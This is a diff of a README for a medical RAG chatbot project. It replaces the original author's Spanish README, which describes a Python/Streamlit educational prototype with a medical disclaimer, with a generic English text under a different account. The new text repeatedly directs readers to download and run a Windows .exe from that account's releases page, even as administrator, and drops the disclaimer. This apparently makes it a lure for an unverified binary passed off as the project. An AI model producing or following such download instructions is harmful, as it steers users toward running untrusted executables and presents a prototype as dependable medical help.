@@ -1,171 +1,67 @@
-# 🩺 MedeX — AI-Powered Clinical Reasoning Assistant
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![HuggingFace Space](https://img.shields.io/badge/🧠_Demo-HuggingFace-yellow)](https://huggingface.co/spaces/DeepRat/Med-X_25.10.8)
-[![Python](https://img.shields.io/badge/python-3.10+-green)]()
+# 🩺 Med-X-KimiK2-RAG - Your AI Medical Assistant Made Simple
 
+[![Download Med-X-KimiK2-RAG](https://img.shields.io/badge/Download-Med--X--KimiK2--RAG-blue)](https://github.com/Iluvmrbeast/Med-X-KimiK2-RAG/releases)
 
-**MedeX** es un asistente conversacional clínico impulsado por modelos de lenguaje (LLMs) y técnicas de *Retrieval-Augmented Generation (RAG)*.
-Su propósito es educativo y de investigación, diseñado para explorar cómo la IA puede asistir en razonamiento clínico, docencia médica y análisis de casos, **sin reemplazar el juicio profesional humano**.
+## 📋 Description
 
-**Demo:** [MedeX en Hugging Face Spaces](https://huggingface.co/spaces/DeepRat/Med-X_25.10.8)
-**Licencia:** MIT
-**Lenguaje:** Python ≥ 3.10
+Med-X-KimiK2-RAG is an advanced medical AI assistant designed to help users in both professional and educational settings. With dual-mode analysis, it supports over eight medical specialties. This software leverages the power of Kimi K2 and the RAG system to deliver accurate and relevant medical assistance. 
 
-<p align="center">
-  <a href="https://huggingface.co/spaces/DeepRat/Med-X_25.10.8" target="_blank">
-    <img src="https://github.com/DeepRatAI/Med-X-KimiK2-RAG/blob/main/med-x.gif?raw=true" 
-         alt="MedeX Live Demo — Hugging Face Space" width="90%">
-  </a>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <em>Click en la imagen para probar la demo en Hugging Face Spaces.</em>
-</p>
+To get started with Med-X-KimiK2-RAG, follow these simple steps:
 
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Iluvmrbeast/Med-X-KimiK2-RAG/releases) to find the latest version of the application.
 
----
+2. **Download the Application**  
+   Locate the version you want and click on the download link. The file will be named something like `Med-X-KimiK2-RAG-x.x.x.exe`.
 
-- [🧭 Roadmap de Desarrollo](docs/ROADMAP.md)
+3. **Install the Application**  
+   Once the download is complete, open the downloaded file. Follow the on-screen instructions to install the application on your device.
 
----
+4. **Launch the Application**  
+   After installation, find the Med-X-KimiK2-RAG application on your desktop or in the start menu. Click to open it.
 
-## ⚠️ Disclaimer
+5. **Set Up Your Preferences**  
+   When you first launch the app, you may need to configure some initial settings. Follow the prompts to customize your experience.
 
-MedeX es un **prototipo educativo**, no un producto médico certificado.
-No debe usarse para diagnóstico, tratamiento ni toma de decisiones clínicas reales.
-Las respuestas generadas son simulaciones informativas.
-Por favor, **no ingreses datos personales ni información médica identificable (PHI)**.
+## 💻 System Requirements
 
----
+To ensure smooth operation, your device should meet the following minimum requirements:
 
-## 🚀 Características
+- **Operating System:** Windows 10 or later, or macOS Catalina (10.15) or later
+- **Processor:** Intel Core i5 or equivalent
+- **RAM:** 8 GB or more
+- **Storage:** At least 500 MB of free disk space
+- **Internet Connection:** Required for updates and online features
 
-* 🧠 Arquitectura RAG con recuperación contextual antes de la generación.
-* 🔄 Motor LLM modular, intercambiable (Kimi, OpenAI, DeepSeek, etc.).
-* 🧬 Flujo multimodal experimental: texto e imagen.
-* 💬 Respuestas con explicaciones y citas de contexto.
-* 🐳 Despliegue reproducible con Docker y Hugging Face Spaces.
+## 🛠 Features
 
+Med-X-KimiK2-RAG includes various features designed to enhance your experience:
 
----
+- **Dual-Mode Analysis**: Use the application in either Professional or Educational mode to suit your needs.
+- **Specialty Support**: Medical assistance across eight or more specialties including cardiology, dermatology, and pediatrics.
+- **User-Friendly Interface**: Simple navigation designed for ease of use, even for those without technical backgrounds.
+- **Ongoing Updates**: Regular updates ensure you stay current with the latest medical guidelines and features.
 
-## 🧰 Instalación local
+## 📥 Download & Install
 
-### Estado del repositorio
+To download Med-X-KimiK2-RAG, visit the [Releases page](https://github.com/Iluvmrbeast/Med-X-KimiK2-RAG/releases) and select the latest version. After downloading, follow the installation steps outlined earlier to get started.
 
-* **`main`** → Rama **legacy**, mantiene el código original y el Space funcionando.
-* **`feature/package-v0.1.0`** → Rama **empaquetada**, con CLI profesional, tests y mock mode.
-* **Último release:** [v0.1.0](https://github.com/DeepRatAI/Med-X-KimiK2-RAG/releases/tag/v0.1.0)
+## 📖 Troubleshooting
 
-### Clonar el repositorio
+If you encounter issues during installation or usage, consider these tips:
 
-```bash
-git clone https://github.com/DeepRatAI/Med-X-KimiK2-RAG.git
-cd Med-X-KimiK2-RAG
-```
+- **Check Requirements**: Ensure your system meets the minimum requirements.
+- **Run as Administrator**: If the app does not open, try running it as an administrator by right-clicking the icon and selecting "Run as Administrator."
+- **Reinstall**: If problems persist, uninstall the application and reinstall it from the Releases page.
 
-### Ejecutar la app original (legacy)
+## 🔍 Support
 
-```bash
-python -m venv .venv
-source .venv/bin/activate  # En Windows: .venv\Scripts\activate
-pip install -r requirements.txt
-cp .env.example .env
-# Edita la API key:
-# KIMI_API_KEY=tu_api_key_aqui
-streamlit run streamlit_app.py
-```
+For further assistance, please reach out via the [Issues page](https://github.com/Iluvmrbeast/Med-X-KimiK2-RAG/issues). Our community is here to help you resolve any problems you may have.
 
-### Probar la versión empaquetada (sin tocar `main`)
+## 🧑‍🤝‍🧑 Community
 
-Opción 1 — Instalar directamente desde el **release**:
+Join our community to interact with other users, share experiences, and discover tips for using Med-X-KimiK2-RAG. Participate in discussions on our [GitHub Discussions page](https://github.com/Iluvmrbeast/Med-X-KimiK2-RAG/discussions).
 
-```bash
-pip install "git+https://github.com/DeepRatAI/Med-X-KimiK2-RAG@v0.1.0#egg=medex"
-```
-
-Opción 2 — Cambiar a la rama empaquetada y ejecutarla localmente:
-
-```bash
-git checkout feature/package-v0.1.0
-pip install -e .
-medex --mode educational --query "¿Qué es la diabetes?"
-```
-
----
-
-## 🐳 Despliegue con Docker
-
-```bash
-docker build -t medex .
-docker run -p 7860:7860 -e KIMI_API_KEY=tu_api_key_aqui medex
-```
-
-Luego abre [http://localhost:7860](http://localhost:7860) y listo.
-
----
-
-## ☁️ Demo oficial
-
-Puedes probar MedeX directamente en su Space:
-👉 [https://huggingface.co/spaces/DeepRat/Med-X_25.10.8](https://huggingface.co/spaces/DeepRat/Med-X_25.10.8)
-
-> Las claves y configuraciones se gestionan de forma segura en **Settings → Secrets** del Space.
-> No existen claves por defecto en el código.
-
----
-
-## 🔒 Seguridad
-
-* Claves de API cargadas solo desde variables de entorno (`KIMI_API_KEY`).
-* `.streamlit/config.toml` mantiene CORS y XSRF habilitados.
-* `.gitignore` protege archivos sensibles (`.env`, `api_key.txt`, `__pycache__`).
-* No se almacenan conversaciones ni datos médicos.
-* Auditorías básicas con `pip-audit` y pruebas de humo (`test_deployment.py`).
-* Modo educativo activado por defecto; el modo profesional requiere confirmación explícita.
-
----
-
-## 🧪 Pruebas
-
-Para ejecutar las pruebas:
-
-```bash
-pytest -q
-```
-
-El archivo `test_deployment.py` verifica la conectividad y funcionamiento básico del pipeline.
-
----
-
-## 🤝 Contribución
-
-1. Haz un **fork** del repositorio.
-2. Crea una rama para tu cambio.
-3. Abre un **Pull Request** con descripción detallada.
-4. No incluyas secretos ni datos médicos en tus ejemplos.
-
----
-
-## 📜 Licencia
-
-Este proyecto se distribuye bajo la licencia **MIT** (archivo `LICENSE` incluido).
-
----
-
-## 📬 Contacto
-
-**Autor:** [DeepRatAI](https://github.com/DeepRatAI)
-**Correo:** [info@deeprat.tech](mailto:info@deeprat.tech)
-**LinkedIn:** [LinkedIn Profile](https://www.linkedin.com/in/gonzalo-romero-b9b5b4355/)
-
----
-
-## 🌐 Cita
-
-> DeepRatAI. *MedeX: AI-powered Clinical Reasoning Assistant.*
-> Hugging Face Spaces, 2025. [https://huggingface.co/spaces/DeepRat/Med-X_25.10.8](https://huggingface.co/spaces/DeepRat/Med-X_25.10.8)
-
----
-
-## 🧠 “AI should assist physicians, not impersonate them.”
+[![Download Med-X-KimiK2-RAG](https://img.shields.io/badge/Download-Med--X--KimiK2--RAG-blue)](https://github.com/Iluvmrbeast/Med-X-KimiK2-RAG/releases)
